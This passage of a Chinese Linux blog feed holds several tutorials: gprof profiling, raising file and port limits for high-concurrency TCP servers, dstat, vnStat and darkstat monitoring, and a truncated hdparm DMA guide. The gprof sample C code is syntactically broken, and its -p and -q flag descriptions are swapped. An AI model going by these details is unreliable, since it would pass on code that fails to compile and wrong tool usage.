      <content type="html"><![CDATA[<p>程 序分析是以某种语言书写的程序为对象，对其内部的运作流程进行分析。程序分析的目的主要有三点：一是通过程序内部各个模块之间的调用关系，整体上把握程序 的运行流程，从而更好地理解程序，从中汲取有价值的内容。二是以系统优化为目的，通过对程序中关键函数的跟踪或者运行时信息的统计，找到系统性能的瓶颈， 从而采取进一步行动对程序进行优化。最后一点，程序分析也有可能用于系统测试和程序调试中。当系统跟踪起来比较复杂，而某个BUG又比较难找时，可以通过一些特殊的数据构造一个测试用例，然后将分析到的函数调用关系和运行时实际的函数调用关系进行对比，从而找出错误代码的位置。</p><p>程序分析工具不同于调试器，它只产生程序运行时某些函数的调用次数、执行时间等等宏观信息，而不是每条语句执行时的详细信息。Gprof是Linux下一个强有力的程序分析工具。对于C、Pascal或者Fortran77语 言的程序，它能够以“日志”的形式记录程序运行时的统计信息：程序运行中各个函数消耗的时间和函数调用关系，以及每个函数被调用的次数等等。从而可以帮助 程序员找出众多函数中耗时最多的函数，也可以帮助程序员分析程序的运行流程。相信这些功能对于分析开源代码的程序员来说，有着相当大的诱惑力。</p><h2 id="用gprof分析程序"><a href="#用gprof分析程序" class="headerlink" title="用gprof分析程序"></a>用gprof分析程序</h2><p>用gprof对程序进行分析主要分以下三个步骤：</p><p>l 用编译器对程序进行编译，加上-pg参数。</p><p>l 运行编译后的程序。</p><p>l 用gprof命令查看程序的运行时信息。</p><p>先以一个简单的例子演示一下吧。随便找一个能够运行的程序的源代码，比如下面的文件test.c：</p><p> 1<br> 2 int IsEven(int x)<br> 3<br> 4 {<br> 5<br> 6 return0== x &1;<br> 7<br> 8 }<br> 9<br>10 int main(int argc, char*argv[]<br>11<br>12 {<br>13<br>14 int i =0;<br>15<br>16 while(++i &lt;1000) IsEven(i);<br>17<br>18 }</p><p>首先，用以下命令进行编译：</p><p> [root@localhost]#gcc –o test –pg test.c</p><p>然后，运行可执行文件test.</p><p> [root@localhost]#./test</p><p>运行后，在当前目录下将生成一个文件gmon.out，这就是gprof生成的文件，保存有程序运行期间函数调用等信息。</p><p>最后，用gprof命令查看gmon.out保存的信息：</p><p> [root@localhost]#gprof test gmon.out –b</p><p>这样就有一大堆信息输出到屏幕上，有函数执行单间，函数调用关系图等等，如下：</p><p>Flat profile:</p><p>Each sample counts as 0.01 seconds.</p><p>no time accumulated</p><p> % cumulative self self total</p><p>time seconds seconds calls Ts/call Ts/call name</p><p> 0.00 0.00 0.00 1000 0.00 0.00 IsEven(int)</p><p> Call graph</p><p>granularity: each sample hit covers 2 byte(s) no time propagated</p><p>index % time self children called name</p><p> 0.00 0.00 1000/1000 main [7]</p><p>[8] 0.0 0.00 0.00 1000 IsEven(int) [8]</p><p>-----------------------------------------------</p><p>Index by function name</p><p> [8] IsEven(int)</p><p>以上介绍了gprof最简单的使用方法，下面针对其使用过程中的三个步骤详细说明。</p><h2 id="编译和链接"><a href="#编译和链接" class="headerlink" title="编译和链接"></a>编译和链接</h2><p>上面的例子中，程序比较简单，只有一个文件。如果源代码有多个文件，或者代码结构比较复杂，编译过程中先生成若干个目标文件，然后又由链接器将这些目标文件链接到一起，这时该怎么使用gprof呢？</p><p>对于由多个源文件组成的程序，编译时需要在生成每个.o文件的时候加上-pg参数，同时在链接的时候也要加上-pg参数。对于链接器不是GCC的情况，如ld，又有特殊的要求。</p><p>同时，-pg参数只能记录源代码中各个函数的调用关系，而不能记录库函数的调用情况。要想记录每个库函数的调用情况，链接的时候必须指定库函数的动态（或者静态）链接库libc_p.a，即加上-lc_p，而不是-lc。</p><p>还要说明的是，如果有一部分代码在编译时指定了-pg参数，而另一部分代码没有指定，则生成的gmon.out文件中将缺少一部分函数，也没有那些函数的调用关系。但是并不影响gprof对其它函数进行记录。</p><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p>编译好的程序运行时和运行一般的程序没有什么不同，只是比正常的程序多生成了一个文件gmon.out。注意，这个文件名是固定的，没法通过参数的设置进行改变。如果程序目录中已经有一个gmon.out，则它会被新的gmon.out覆盖掉。</p><p>关于生成的gmon.out文件所在的目录，也有以下约定：程序退出时所运行的文件所在目录就是生成的gmon.out文件所在的目录。如果一个程序执行过程中调用了另一个程序，并在另一个程序的运行中终止，则gmon.out会在另一个程序所在的目录中生成。</p><p>还有一点要注意的就是当程序非正常终止时不会生成gmon.out文件，也因此就没法查看程序运行时的信息。只有当程序从main函数中正常退出，或者通过系统调用exit()函数而退出时，才会生成gmon.out文件。而通过底层调用如_exit()等退出时不会生成gmon.out。</p><h2 id="查看"><a href="#查看" class="headerlink" title="查看"></a>查看</h2><p>查看程序运行信息的命令是gprof，它以gmon.out文件作为输入，也就是将gmon.out文件翻译成可读的形式展现给用户。其命令格式如下：</p><p> gprof [可执行文件] [gmon.out文件] [其它参数]</p><p>方括号中的内容可以省略。如果省略了“可执行文件”，gprof会在当前目录下搜索a.out文件作为可执行文件，而如果省略了gmon.out文件，gprof也会在当前目录下寻找gmon.out。其它参数可以控制gprof输出内容的格式等信息。最常用的参数如下：</p><p>l -b 不再输出统计图表中每个字段的详细描述。</p><p>l -p 只输出函数的调用图（Call graph的那部分信息）。</p><p>l -q 只输出函数的时间消耗列表。</p><p>l -e Name 不再输出函数Name 及其子函数的调用图（除非它们有未被限制的其它父函数）。可以给定多个 -e 标志。一个 -e 标志只能指定一个函数。</p><p>l -E Name 不再输出函数Name 及其子函数的调用图，此标志类似于 -e 标志，但它在总时间和百分比时间的计算中排除了由函数Name 及其子函数所用的时间。</p><p>l -f Name 输出函数Name 及其子函数的调用图。可以指定多个 -f 标志。一个 -f 标志只能指定一个函数。</p><p>l -F Name 输出函数Name 及其子函数的调用图，它类似于 -f 标志，但它在总时间和百分比时间计算中仅使用所打印的例程的时间。可以指定多个 -F 标志。一个 -F 标志只能指定一个函数。-F 标志覆盖 -E 标志。</p><p>l -z 显示使用次数为零的例程（按照调用计数和累积时间计算）。</p><p>不过,gprof不能显示对象之间的继承关系,这也是它的弱点.</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>配置开发支持高并发TCP连接的Linux应用程序全攻略</title>
      <link href="/2009/12/22/configure-development-to-support-linux-applications-with-high-concurrency-tcp-connections/"/>
      <url>/2009/12/22/configure-development-to-support-linux-applications-with-high-concurrency-tcp-connections/</url>
      <content type="html"><![CDATA[<p>1、修改用户进程可打开文件数限制  </p><p>   在Linux平台上，无论编写客户端程序还是服务端程序，在进行高并发TCP连接处理时，最高的并发数量都要受到系统对用户单一进程同时可打开文件数量 的限制(这是因为系统为每个TCP连接都要创建一个socket句柄，每个socket句柄同时也是一个文件句柄)。可使用ulimit命令查看系统允许 当前用户进程打开的文件数限制：<br>   [speng@as4 ~]$ ulimit -n<br>   1024<br>   这表示当前用户的每个进程最多允许同时打开1024个文件，这1024个文件中还得除去每个进程必然打开的标准输入，标准输出，标准错误，服务器监听 socket，进程间通讯的unix域socket等文件，那么剩下的可用于客户端socket连接的文件数就只有大概1024-10=1014个左右。 也就是说缺省情况下，基于Linux的通讯程序最多允许同时1014个TCP并发连接。  </p><p>   对于想支持更高数量的TCP并发连接的通讯处理程序，就必须修改Linux对当前用户的进程同时打开的文件数量的软限制(soft limit)和硬限制(hardlimit)。其中软限制是指Linux在当前系统能够承受的范围内进一步限制用户同时打开的文件数；硬限制则是根据系统 硬件资源状况(主要是系统内存)计算出来的系统最多可同时打开的文件数量。通常软限制小于或等于硬限制。  </p><p>   修改上述限制的最简单的办法就是使用ulimit命令：<br>   [speng@as4 ~]$ ulimit -n &lt;file_num&gt;<br>   上述命令中，在&lt;file_num&gt;中指定要设置的单一进程允许打开的最大文件数。如果系统回显类似于“Operation notpermitted”之类的话，说明上述限制修改失败，实际上是因为在&lt;file_num&gt;中指定的数值超过了Linux系统对该用户 打开文件数的软限制或硬限制。因此，就需要修改Linux系统对用户的关于打开文件数的软限制和硬限制。  </p><p>   第一步，修改/etc/security/limits.conf文件，在文件中添加如下行：<br>   speng soft nofile 10240<br>   speng hard nofile 10240<br>   其中speng指定了要修改哪个用户的打开文件数限制，可用’*’号表示修改所有用户的限制；soft或hard指定要修改软限制还是硬限制；10240则指定了想要修改的新的限制值，即最大打开文件数(请注意软限制值要小于或等于硬限制)。修改完后保存文件。  </p><p>   第二步，修改/etc/pam.d/login文件，在文件中添加如下行：<br>   session required /lib/security/pam_limits.so<br>   这是告诉Linux在用户完成系统登录后，应该调用pam_limits.so模块来设置系统对该用户可使用的各种资源数量的最大限制(包括用户可打开 的最大文件数限制)，而pam_limits.so模块就会从/etc/security/limits.conf文件中读取配置来设置这些限制值。修改 完后保存此文件。  </p><p>   第三步，查看Linux系统级的最大打开文件数限制，使用如下命令：<br>   [speng@as4 ~]$ cat /proc/sys/fs/file-max<br>   12158<br>   这表明这台Linux系统最多允许同时打开(即包含所有用户打开文件数总和)12158个文件，是Linux系统级硬限制，所有用户级的打开文件数限制 都不应超过这个数值。通常这个系统级硬限制是Linux系统在启动时根据系统硬件资源状况计算出来的最佳的最大同时打开文件数限制，如果没有特殊需要，不 应该修改此限制，除非想为用户级打开文件数限制设置超过此限制的值。修改此硬限制的方法是修改/etc/rc.local脚本，在脚本中添加如下行：<br>   echo 22158 &gt; /proc/sys/fs/file-max<br>   这是让Linux在启动完成后强行将系统级打开文件数硬限制设置为22158。修改完后保存此文件。  </p><p>   完成上述步骤后重启系统，一般情况下就可以将Linux系统对指定用户的单一进程允许同时打开的最大文件数限制设为指定的数值。如果重启后用 ulimit-n命令查看用户可打开文件数限制仍然低于上述步骤中设置的最大值，这可能是因为在用户登录脚本/etc/profile中使用ulimit -n命令已经将用户可同时打开的文件数做了限制。由于通过ulimit-n修改系统对用户可同时打开文件的最大数限制时，新修改的值只能小于或等于上次 ulimit-n设置的值，因此想用此命令增大这个限制值是不可能的。所以，如果有上述问题存在，就只能去打开/etc/profile脚本文件，在文件 中查找是否使用了ulimit-n限制了用户可同时打开的最大文件数量，如果找到，则删除这行命令，或者将其设置的值改为合适的值，然后保存文件，用户退 出并重新登录系统即可。<br>   通过上述步骤，就为支持高并发TCP连接处理的通讯处理程序解除关于打开文件数量方面的系统限制。  </p><p>2、修改网络内核对TCP连接的有关限制  </p><p>   在Linux上编写支持高并发TCP连接的客户端通讯处理程序时，有时会发现尽管已经解除了系统对用户同时打开文件数的限制，但仍会出现并发TCP连接数增加到一定数量时，再也无法成功建立新的TCP连接的现象。出现这种现在的原因有多种。  </p><p>   第一种原因可能是因为Linux网络内核对本地端口号范围有限制。此时，进一步分析为什么无法建立TCP连接，会发现问题出在connect()调用返 回失败，查看系统错误提示消息是“Can’t assign requestedaddress”。同时，如果在此时用tcpdump工具监视网络，会发现根本没有TCP连接时客户端发SYN包的网络流量。这些情况 说明问题在于本地Linux系统内核中有限制。其实，问题的根本原因在于Linux内核的TCP/IP协议实现模块对系统中所有的客户端TCP连接对应的 本地端口号的范围进行了限制(例如，内核限制本地端口号的范围为1024~32768之间)。当系统中某一时刻同时存在太多的TCP客户端连接时，由于每 个TCP客户端连接都要占用一个唯一的本地端口号(此端口号在系统的本地端口号范围限制中)，如果现有的TCP客户端连接已将所有的本地端口号占满，则此 时就无法为新的TCP客户端连接分配一个本地端口号了，因此系统会在这种情况下在connect()调用中返回失败，并将错误提示消息设为“Can’t assignrequested address”。有关这些控制逻辑可以查看Linux内核源代码，以linux2.6内核为例，可以查看tcp_ipv4.c文件中如下函数：<br>   static int tcp_v4_hash_connect(struct sock *sk)<br>   请注意上述函数中对变量sysctl_local_port_range的访问控制。变量sysctl_local_port_range的初始化则是在tcp.c文件中的如下函数中设置：<br>   void __init tcp_init(void)<br>   内核编译时默认设置的本地端口号范围可能太小，因此需要修改此本地端口范围限制。<br>   第一步，修改/etc/sysctl.conf文件，在文件中添加如下行：<br>   net.ipv4.ip_local_port_range = 1024 65000<br>   这表明将系统对本地端口范围限制设置为1024~65000之间。请注意，本地端口范围的最小值必须大于或等于1024；而端口范围的最大值则应小于或等于65535。修改完后保存此文件。<br>   第二步，执行sysctl命令：<br>   [speng@as4 ~]$ sysctl -p<br>   如果系统没有错误提示，就表明新的本地端口范围设置成功。如果按上述端口范围进行设置，则理论上单独一个进程最多可以同时建立60000多个TCP客户端连接。  </p><p>   第二种无法建立TCP连接的原因可能是因为Linux网络内核的IP_TABLE防火墙对最大跟踪的TCP连接数有限制。此时程序会表现为在 connect()调用中阻塞，如同死机，如果用tcpdump工具监视网络，也会发现根本没有TCP连接时客户端发SYN包的网络流量。由于 IP_TABLE防火墙在内核中会对每个TCP连接的状态进行跟踪，跟踪信息将会放在位于内核内存中的conntrackdatabase中，这个数据库 的大小有限，当系统中存在过多的TCP连接时，数据库容量不足，IP_TABLE无法为新的TCP连接建立跟踪信息，于是表现为在connect()调用 中阻塞。此时就必须修改内核对最大跟踪的TCP连接数的限制，方法同修改内核对本地端口号范围的限制是类似的：<br>   第一步，修改/etc/sysctl.conf文件，在文件中添加如下行：<br>   net.ipv4.ip_conntrack_max = 10240<br>   这表明将系统对最大跟踪的TCP连接数限制设置为10240。请注意，此限制值要尽量小，以节省对内核内存的占用。<br>   第二步，执行sysctl命令：<br>   [speng@as4 ~]$ sysctl -p<br>   如果系统没有错误提示，就表明系统对新的最大跟踪的TCP连接数限制修改成功。如果按上述参数进行设置，则理论上单独一个进程最多可以同时建立10000多个TCP客户端连接。  </p><p>3、使用支持高并发网络I/O的编程技术  </p><p>   在Linux上编写高并发TCP连接应用程序时，必须使用合适的网络I/O技术和I/O事件分派机制。  </p><p>   可用的I/O技术有同步I/O，非阻塞式同步I/O(也称反应式I/O)，以及异步I/O。在高TCP并发的情形下，如果使用同步I/O，这会严重阻塞 程序的运转，除非为每个TCP连接的I/O创建一个线程。但是，过多的线程又会因系统对线程的调度造成巨大开销。因此，在高TCP并发的情形下使用同步 I/O是不可取的，这时可以考虑使用非阻塞式同步I/O或异步I/O。非阻塞式同步I/O的技术包括使用select()，poll()，epoll等机 制。异步I/O的技术就是使用AIO。  </p><p>   从I/O事件分派机制来看，使用select()是不合适的，因为它所支持的并发连接数有限(通常在1024个以内)。如果考虑性能，poll()也是 不合适的，尽管它可以支持的较高的TCP并发数，但是由于其采用“轮询”机制，当并发数较高时，其运行效率相当低，并可能存在I/O事件分派不均，导致部 分TCP连接上的I/O出现“饥饿”现象。而如果使用epoll或AIO，则没有上述问题(早期Linux内核的AIO技术实现是通过在内核中为每个 I/O请求创建一个线程来实现的，这种实现机制在高并发TCP连接的情形下使用其实也有严重的性能问题。但在最新的Linux内核中，AIO的实现已经得 到改进)。  </p><p>   综上所述，在开发支持高并发TCP连接的Linux应用程序时，应尽量使用epoll或AIO技术来实现并发的TCP连接上的I/O控制，这将为提升程序对高并发TCP连接的支持提供有效的I/O保证。</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>一个很好的性能监测工具dstat</title>
      <link href="/2009/12/22/a-good-performance-monitoring-tool-dstat/"/>
      <url>/2009/12/22/a-good-performance-monitoring-tool-dstat/</url>
      <content type="html"><![CDATA[<p>无意中发现一个很好的性能监测工具dstat,实在是太强大了，可以完成vmstat，iostat，netstat等等工具才能完成的任务，而且是彩色显示的，各种情况一目了然，更美妙的它可通过参数来指定显示哪些内容，如只显示CPU、内存等等，一切都可以定制，实在是方便，不过有些功能还是要用像iostat这样的工具来做，不过还是强列推荐dstat确实不错。  </p><p>安装命令apt-get install dstat  </p><p>参数真多啊，说一下常用的吧  </p><p>Dstat options:<br>  -c, –cpu              显示CPU情况<br>     -C 0,3,total           include cpu0, cpu3 and total<br>  -d, –disk             显示磁盘情况<br>     -D total,hda           include hda and total<br>  -g, –page             enable page stats<br>  -i, –int              enable interrupt stats<br>     -I 5,eth2              include int5 and interrupt used by eth2<br>  -l, –load             enable load stats<br>  -m, –mem              显示内存情况<br>  -n, –net              显示网络情况<br>     -N eth1,total          可以指定网络接口<br>  -p, –proc             enable process stats<br>  -s, –swap             显示swap情况<br>     -S swap1,total         可以指定多个swap<br>  -t, –time             enable time counter<br>  -y, –sys              enable system stats<br>  –ipc                  报告IPC消息队列和信号量的使用情况<br>  –lock                 enable lock stats<br>  –raw                  enable raw stats<br>  –tcp                  enable tcp stats<br>  –udp                  enable udp stats<br>  –unix                 enable unix stats  </p><p>  -M stat1,stat2         enable external stats<br>     –mods stat1,stat2  </p><p>  -a, –all              使用-cdngy 缺省的就是这样显示<br>  -f, –full             使用 -C, -D, -I, -N and -S 显示<br>  -v, –vmstat           使用-pmgdsc -D 显示  </p><p>  –integer              show integer values<br>  –nocolor              disable colors (implies –noupdate)<br>  –noheaders            只显示一次表头以后就不显示了,使用重定向写入文件时很有用<br>  –noupdate             disable intermediate updates<br>  –output file          写入到CVS文件中  </p><p>上个运行结果：<br>jonsk:~# dstat<br>—-total-cpu-usage—- -dsk/total- -net/total- —paging– —system–<br>usr sys idl wai hiq siq|_read _writ|_recv _send|__in_ _out_|_int_ _csw_<br> 13  49  29   8   1   1| 424k   23k|   0     0 |   0     0 | 275   200<br>  0   1  95   3   0   1|8192B    0 | 297B   70B|   0     0 | 241    33<br>  0   1  99   0   0   0|   0     0 |  92B    0 |   0     0 | 243    14<br>  0   1  99   0   0   0|   0     0 | 395B    0 |   0     0 | 244    20  </p><p>很 简单，一看就明白了，要说明的是如果当usr和sys的数值大于80时说明cpu的负载过重，这个软件和vmstat很像,不过和vmstat相比好像少 了io部份的显示dstat只能显示磁盘的吞吐量而不是显示负载情况，dstat和几乎所有监控软件一样，只能对整个系统进行监控而不能对某一个进程或某 一个程序进行深入分析。如果你知道如何设置，请通知我。  </p><p>我常使用的参数是  </p><p>dstat -cdlmnpsy  </p><p>在1024×768的屏幕上正好全部显示出来，最好是将上面的命令设置成别名  </p><p>alias dstat=’dstat -cdlmnpsy’</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Linux VPS流量查看/监测工具 — vnStat</title>
      <link href="/2009/12/22/linux-vps-flow-view-monitoring-tool-vnstat/"/>
      <url>/2009/12/22/linux-vps-flow-view-monitoring-tool-vnstat/</url>
      <content type="html"><![CDATA[<p>各位<a href="http://www.vpser.net/" target="_blank" rel="noopener">VPSer</a>在使用Linux VPS的时候应该还是比较关注自己VPS的流量的，怕有盗链或者流量超标而被停等等。而且现在N多家VPS，都把<a href="http://www.vpser.net/vps-cp/hypervm-bug.html" target="_blank" rel="noopener">HyperVM面板关闭</a>了，根本看不到用了多少流量及各个时段的网站流量状况，所以我们急需一个流量监控工具。</p><p><a href="http://humdi.net/vnstat/" target="_blank" rel="noopener">vnStat</a>是一个应用于Linux或BSD平台，对网卡流量做监控。 因为并非是基于网络包嗅探的方式而是基于/proc的分析。现在vnStat已经有出<a href="http://www.sqweek.com/sqweek/index.php?p=1" target="_blank" rel="noopener">vnstat PHP frontend</a> 扩展了，可以以PHP脚本的形式直接调用vnStat监测的数据，如下图：</p><p><a href="http://www.vpser.net/uploads/2009/08/vnstat1.png" target="_blank" rel="noopener">http://www.vpser.net/uploads/2009/08/vnstat1.png</a></p><p><a href="http://www.vpser.net/uploads/2009/08/vnstat2.png" target="_blank" rel="noopener">http://www.vpser.net/uploads/2009/08/vnstat2.png</a></p><p>下面说一下具体的安装步骤：</p><p>下载：<br>wget <a href="http://soft.vpser.net/status/vnstat-1.9.tar.gz" target="_blank" rel="noopener">http://soft.vpser.net/status/vnstat-1.9.tar.gz</a><br>解压：<br>tar xvzf vnstat-1.9.tar.gz<br>进入目录：<br>cd vnstat-1.9<br>编译安装：<br>make<br>make install<br>如果64位平台上编译的话用make 64bit命令</p><p>这样vnstat 就安装好了。下面讲vnstat的工作运行配置。</p><p>下载最新版vnstat PHP frontend，</p><p>地址：<a href="http://soft.vpser.net/status/vnstat_php_frontend-1.4.1.tar.gz" target="_blank" rel="noopener">http://soft.vpser.net/status/vnstat_php_frontend-1.4.1.tar.gz</a></p><p>解压文件夹改名为vnstat，然后上传到某个网站根目录下，这样就可以以<a href="http://www.mydomain.com/vnstat" target="_blank" rel="noopener">http://www.vpser.net/vnstat</a> 来访问到，就出来页面了，但此时没有数据，因为还要使系统生成数据。</p><p>建立流量数据库:<br>ifconfig 指令查看需要监控的网卡,假设只有eth0<br>然后生成数据库:<br>/usr/bin/vnstat -u -i eth0<br>然后定时更新数据库,通过cron的方式：</p><p>实际上在安装vnstat时，已经在系统里安装好了vnstat的cron，crontab内容在/etc/cron.d/vnstat，如果没有使用命令touch /etc/cron.d/vnstat 创建。<br>内容为:<br>0-55/5 <em>        </em> <em> </em>   root   vnstat -u -i eth0<br>0-55/5 <em>        </em> <em> </em>   root   vnstat –dumpdb -i eth0 &gt;/var/lib/vnstat/vnstat_dump_eth0</p><p>第一行为安装时自动指定的.</p><p>第二行是为了更新eth0的数据后，dump出来一个文件，给 php访问接口访问.</p><p>这里dump出来的vnstat_dump_eth0 文件名是有规定的。</p><p># 注意：有时候采用上面的收集办法，无法采集到数据，可以采用下面的办法</p><p>vim /var/lib/vnstat/dump.sh</p><p>vnstat -u -i eth0<br>vnstat –dumpdb -i eth0 &gt;/var/lib/vnstat/vnstat_dump_eth0</p><p>crontab -e</p><p>加入执行命令</p><p><em>/5 </em> <em> </em> * sh /var/lib/vnstat/dump.sh</p><p>再删除vnstat原有的cron</p><p>rm /etc/cron.d/vnstat</p><p>#</p><p>在vnstat_php_frontend-1.4.1.tar.gz 包里的config.php 里有说明。</p><p>最后，编辑　vnstat/config.php 这个文件，将数据目录改为　/var/lib/vnstat/，如果不存在此目录，需要使用mkdir -p /var/lib/vnstat/ 创建此目录。<br>即：<br>$data_dir = ‘/var/lib/vnstat/;</p><p>指定显示标题</p><p>$iface_title[‘eth0’] = ‘VPSer-<a href="http://www.vpser.net/go/linode" target="_blank" rel="noopener">Linode</a>‘;</p><p>下面设置以什么图片格式显示，可以是svg或png，一般选择png就可以，svg在IE下需要安装插件，Firefox不需要；如果用png在IE、Firefox下均能直接显示。</p><p>$graph_format=’png’;</p><p>指定vnstat的安装目录，如果是安装上述方法安装，直接按下面填写即可。</p><p>$vnstat_bin = ‘/usr/bin/vnstat’;</p><p>将要监控的网卡指定为１个：</p><p>// list of network interfaces monitored by vnStat<br>    //\$iface_list = array(’eth0′, ‘eth1′, ’sixxs’);<br>        $iface_list = array(’eth0′,);</p><p>// will be displayed instead<br>    //<br>    \$iface_title[‘eth0’] = ‘Internal’;<br>    //\$iface_title[‘eth1’] = ‘Internet’;<br>    //$iface_title[‘sixxs’] = ‘SixXS IPv6′;</p><p>这一切都搞好后，现在用　<a href="http://www.mydomain.com/vnstat/" target="_blank" rel="noopener">www.mydomain.com/vnstat/</a>访问，就会发现有流量统计了,统计的数据更新是５分钟刷新一次．</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Darkstat帮你快速分析网络通信(组图)</title>
      <link href="/2009/12/22/darkstat-helps-you-quickly-analyze-network-communications-group-diagrams/"/>
      <url>/2009/12/22/darkstat-helps-you-quickly-analyze-network-communications-group-diagrams/</url>
      <content type="html"><![CDATA[<p>Linux系统的通信分析工具中，有的程序功能强大，特性也不少，如ntop 和vnstat等就得到了广泛使用。不过，有时，你只是需要一个能够给你快速分析通信量的工具，它可以提供进出网络主机的通信量基本信息。 Darkstat，是一个数据包嗅探器，它以一个后台过程的形式运行，并能完成上述任务。它收集关于网络利用情况的统计数据，并通过HTTP协议显示出 来。</p><p>　　笔者在CentOS 5和 Fedora 7系统上测试了最新的版本(darkstat-3.0.707.tar.bz2)。你可以用tar-xvjf darkstat-3.0.707.tar.bz2解开新的内核源程序，然后安装之。要调用darkstat，请键入：</p><p>以下是引用片段：<br>　　darkstat –i eth0</p><p>　　这个程序会在选中的接口开始检查数据，并以后台形式运行，并将结果返回到外壳。这些行看起来是如下的样子：</p><p>以下是引用片段：<br>　　darkstat 3.0.707 (built with libpcap 2.4)<br>　　darkstat (19646): starting up<br>　　darkstat (19646): daemonizing to run in the background!<br>　　darkstat (19647): I am the main process<br>　　darkstat (19647): DNS child has PID 19648<br>　　darkstat (19646): parent waiting<br>　　darkstat (19647): caplen is 54<br>　　darkstat (19648): set uid/gid to 99/99<br>　　darkstat (19647): capturing in promiscuous mode<br>　　darkstat (19647): listening on 0.0.0.0:667<br>　　darkstat (19647): loaded 129 protos<br>　　darkstat (19647): loaded 4594 tcp and 4549 udp servs, from total 9158<br>　　darkstat (19647): chrooted into: /var/empty<br>　　darkstat (19647): set uid/gid to 99/99<br>　　darkstat (19647): local_ip update(eth0) = 192.168.0.5<br>　　darkstat (19647): entering main loop<br>　　darkstat (19646): parent done reading, calling waitpid<br>　　darkstat (19646): waitpid ret 0, status is 3</p><p>　　可以从第三行看出，darkstat作为一种服务运行，并自动成为一个后台进程。第四行指出了其PID。如果要终止这个程序可以用：</p><p>以下是引用片段：<br>　　kill -9 19647</p><p>　　或</p><p>以下是引用片段：<br>　　killall darkstat</p><p>　　但用户必须用一个浏览器(http:server:667)来显示由darkstat所收集的数据，其实用darkstat自身内置的Web服务器就可以实现。第十行指明了667是浏览器应当连接的端口。用户可以用-p选项将它改为另外一个端口。</p><p>　　-l开关用“网络/掩码”的语法形式定义了一个本地网络，这个网络的所有通信(进入的或离开的)都以图形化的形式显示。-f选项允许用户过滤数据包：</p><p>以下是引用片段：<br>　　darkstat –i eth0 –l 192.168.0.0/255.255.255.0 –f “port 22”</p><p>　　在这个例子中，我们正在过滤运行在22号端口上的SSH协议的网络数据包，因此用户可以定义哪些机器正在使用这个协议。其过滤器语法基于tcpdump,用户可以参考其文档以了解更多的信息。</p><p><a href="http://networking.ctocio.com.cn/TLimages/picview/?/imagelist/2007/348/5e85239855py.JPG" target="_blank" rel="noopener"><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/networking_ctocio_5e85239855pys.jpg" alt="Darkstat帮你快速分析网络通信" title="Darkstat帮你快速分析网络通信(组图) - suchalin - 为了更好的生活而奋斗！"></a></p><p>　　图1</p><p><a href="http://networking.ctocio.com.cn/TLimages/picview/?/imagelist/2007/348/4z2fs902r4kr.JPG" target="_blank" rel="noopener"><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/networking_ctocio_4z2fs902r4krs.jpg" alt="Darkstat帮你快速分析网络通信" title="Darkstat帮你快速分析网络通信(组图) - suchalin - 为了更好的生活而奋斗！"></a></p><p>　　图2</p><h5 id="Linux系统的通信分析工具中，有的程序功能强大，特性也不少，如ntop-和vnstat等就得到了广泛使用。不过，有时，你只是需要一个能够给你快速分析通信量的工具，它可以提供进出网络主机的通信量基本信息……"><a href="#Linux系统的通信分析工具中，有的程序功能强大，特性也不少，如ntop-和vnstat等就得到了广泛使用。不过，有时，你只是需要一个能够给你快速分析通信量的工具，它可以提供进出网络主机的通信量基本信息……" class="headerlink" title="　Linux系统的通信分析工具中，有的程序功能强大，特性也不少，如ntop 和vnstat等就得到了广泛使用。不过，有时，你只是需要一个能够给你快速分析通信量的工具，它可以提供进出网络主机的通信量基本信息……"></a>　Linux系统的通信分析工具中，有的程序功能强大，特性也不少，如ntop 和vnstat等就得到了广泛使用。不过，有时，你只是需要一个能够给你快速分析通信量的工具，它可以提供进出网络主机的通信量基本信息……</h5><p>“);</p><p><a href="http://networking.ctocio.com.cn/TLimages/picview/?/imagelist/2007/348/528ijyze0dh4.JPG" target="_blank" rel="noopener"><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/networking_ctocio_528ijyze0dh4s.jpg" alt="Darkstat帮你快速分析网络通信" title="Darkstat帮你快速分析网络通信(组图) - suchalin - 为了更好的生活而奋斗！"></a></p><p>　　图3</p><p>　 　Darkstat很简单，因此不要期望它有什么特异功能。图1中的页面显示了四个图表和一些基本的信息。将鼠标放到柱形图的某个柱上就会以字节 数显示这个时点进入和输入的数据。图2显示了网络上每台主机的IP地址和MAC地址，以及进入、转出的数据包数量。在IP地址上单击，就会显示关于特定主 机的更多信息，如哪些端口是开放的，正使用哪些协议。用户可以按照降序对进入、转出和总共的流量进行排序。</p><p>　　不过，darkstat显示在浏览器中的信息并不能自动加载，因此为了刷新内容，你必须重新加载页面。不过， dartstat数据能够以简单易懂的形式显示局域网中的基本通信信息，对一般的网络监视、管理已足矣。</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>在Linux下开启硬盘DMA</title>
      <link href="/2009/12/22/open-hard-disk-dma-under-linux/"/>
      <url>/2009/12/22/open-hard-disk-dma-under-linux/</url>
      <content type="html"><![CDATA[<p>注意：/sbin/hdparm命令不支持SATA硬盘。  </p><pre><code>支持SATA硬盘的版本： sdparm  lai@ubuntu-lai:~$ sudo apt-get install sdparm  Linux下的32位I/O和DMA默认是关闭的。如果用的是16位I/O的话，就无法充分发挥电脑的性能。  </code></pre><p>　　如果要打开32位I/O和DMA，就需要以root身份进行设置。为了降低因出错而重启系统对文件系统的损害，最好以单用户模式进行。  </p><p>首先，使用下面的命令检查硬盘驱动器的当前I/O情况：  </p><p>[root@anima lwg]# /sbin/hdparm -t /dev/hda  </p><p>/dev/hda:<br> Timing buffered disk reads:    8 MB in  3.31 seconds =   2.42 MB/sec<br>[root@anima lwg]#  </p><p>　　如果要显示当前I/O、DMA设置，可以分别使用下面的命令：  </p><p>[root@anima lwg]# /sbin/hdparm -c /dev/hda    （显示当前I/O设置）  </p><p>/dev/hda:<br> IO_support   =  0 (default 16-bit)<br>[root@anima lwg]# /sbin/hdparm -d /dev/hda    （显示当前DMA设置）  </p><p>/dev/hda:<br> using_dma    =  0 (off)<br>[root@anima lwg]#  </p><p>　<br>　　